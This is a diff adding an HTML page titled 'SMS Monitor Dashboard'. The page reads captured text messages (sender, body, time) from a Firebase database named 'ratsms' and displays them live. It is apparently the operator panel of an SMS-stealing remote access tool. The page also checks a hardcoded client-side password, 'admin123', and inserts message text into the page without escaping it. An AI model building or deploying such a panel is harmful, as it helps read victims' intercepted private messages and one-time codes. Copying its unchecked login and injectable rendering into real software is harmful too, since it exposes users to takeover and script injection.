@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Monitor Dashboard</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+        body { background-color: #f3f4f6; font-family: sans-serif; }
+    </style>
+</head>
+<body>
+
+    <div id="login-section" class="fixed inset-0 bg-gray-100 flex items-center justify-center p-4 z-50">
+        <div class="bg-white p-8 rounded-3xl shadow-lg w-full max-w-md text-center">
+            <h2 class="text-2xl font-black text-gray-800 mb-2 tracking-tight">Dashboard Locked</h2>
+            <p class="text-xs text-gray-400 mb-6">Enter password to view messages</p>
+            
+            <div class="space-y-4">
+                <input type="password" id="password-input" class="w-full px-4 py-3 border border-gray-200 rounded-2xl focus:outline-none focus:ring-2 focus:ring-blue-500 text-center text-lg font-bold" placeholder="••••••••">
+                <button onclick="handleLogin()" class="w-full bg-blue-600 text-white py-3 rounded-2xl font-bold tracking-wide hover:bg-blue-700 transition transform active:scale-98 shadow-md cursor-pointer">
+                    Unlock Dashboard
+                </button>
+                <p id="login-error" class="text-red-500 text-sm font-semibold hidden mt-2">❌ Incorrect Password!</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="main-content" class="max-w-4xl mx-auto p-4 md:p-8 hidden">
+        
+        <div class="flex justify-between items-center bg-white p-6 rounded-2xl shadow-sm mb-6">
+            <div>
+                <h1 class="text-2xl font-bold text-gray-800">SMS Monitor Dashboard</h1>
+                <p class="text-sm text-gray-500">Real-time upcoming messages tracking</p>
+            </div>
+            <div class="flex items-center space-x-4">
+                <div class="flex items-center space-x-2">
+                    <span class="relative flex h-3 w-3">
+                      <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                      <span class="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
+                    </span>
+                    <span class="text-sm font-medium text-green-600">Live</span>
+                </div>
+                <button onclick="handleLock()" class="bg-red-50 text-red-600 font-bold px-4 py-2 rounded-xl text-xs hover:bg-red-100 transition cursor-pointer">
+                    Lock Panel
+                </button>
+            </div>
+        </div>
+
+        <div id="loader" class="text-center py-10">
+            <p class="text-gray-500 animate-pulse">Connecting to Firebase Database...</p>
+        </div>
+
+        <div id="messages-container" class="space-y-4 hidden"></div>
+
+        <div id="no-messages" class="hidden text-center bg-white p-12 rounded-2xl shadow-sm text-gray-400">
+            No messages captured yet. Send a test SMS to check.
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            databaseURL: "https://ratsms-d15e7-default-rtdb.firebaseio.com" 
+        };
+
+        // Master Password
+        const MASTER_PASSWORD = "admin123";
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        let dbRef = null; // Reference holder for listener detachment
+
+        // DOM Elements
+        const loginSection = document.getElementById('login-section');
+        const mainContent = document.getElementById('main-content');
+        const messagesContainer = document.getElementById('messages-container');
+        const loader = document.getElementById('loader');
+        const noMessages = document.getElementById('no-messages');
+
+        // Handle Unlocking
+        function handleLogin() {
+            const enteredPass = document.getElementById('password-input').value;
+            
+            if (enteredPass === MASTER_PASSWORD) {
+                // UI Toggle
+                loginSection.classList.add('hidden');
+                mainContent.classList.remove('hidden');
+                document.getElementById('login-error').classList.add('hidden');
+                
+                // Start Fetching Data ONLY after successful login
+                startListeningMessages();
+            } else {
+                document.getElementById('login-error').classList.remove('hidden');
+            }
+        }
+
+        // Handle Locking
+        function handleLock() {
+            // Detach Firebase listener so data stops downloading in background
+            if (dbRef) {
+                dbRef.off();
+            }
+
+            // Reset UI States
+            document.getElementById('password-input').value = '';
+            messagesContainer.innerHTML = '';
+            messagesContainer.classList.add('hidden');
+            loader.style.display = 'block';
+
+            loginSection.classList.remove('hidden');
+            mainContent.classList.add('hidden');
+        }
+
+        // Firebase Stream Connection
+        function startListeningMessages() {
+            dbRef = database.ref('messages');
+            
+            dbRef.on('value', (snapshot) => {
+                loader.style.display = 'none';
+                messagesContainer.innerHTML = ''; 
+
+                if (snapshot.exists()) {
+                    messagesContainer.classList.remove('hidden');
+                    noMessages.classList.add('hidden');
+
+                    const data = snapshot.val();
+                    const messagesList = Object.keys(data).map(key => ({
+                        id: key,
+                        ...data[key]
+                    }));
+
+                    // Sort: Latest First
+                    messagesList.sort((a, b) => b.timestamp - a.timestamp);
+
+                    messagesList.forEach((sms) => {
+                        const smsDate = new Date(sms.timestamp).toLocaleString('en-IN', {
+                            timeZone: 'Asia/Kolkata',
+                            dateStyle: 'medium',
+                            timeStyle: 'short'
+                        });
+
+                        const cardHtml = `
+                            <div class="bg-white p-6 rounded-2xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow">
+                                <div class="flex justify-between items-start mb-3">
+                                    <span class="bg-blue-50 text-blue-600 font-semibold px-3 py-1 rounded-full text-sm">
+                                        ${sms.sender}
+                                    </span>
+                                    <span class="text-xs text-gray-400 font-medium">
+                                        ${smsDate}
+                                    </span>
+                                </div>
+                                <p class="text-gray-700 whitespace-pre-wrap break-words text-sm md:text-base">
+                                    ${sms.message}
+                                </p>
+                            </div>
+                        `;
+                        messagesContainer.innerHTML += cardHtml;
+                    });
+
+                } else {
+                    messagesContainer.classList.add('hidden');
+                    noMessages.classList.remove('hidden');
+                }
+            }, (error) => {
+                console.error("Firebase Error: ", error);
+                loader.innerHTML = `<p class="text-red-500">Error connecting to database.</p>`;
+            });
+        }
+    </script>
+</body>
+</html>
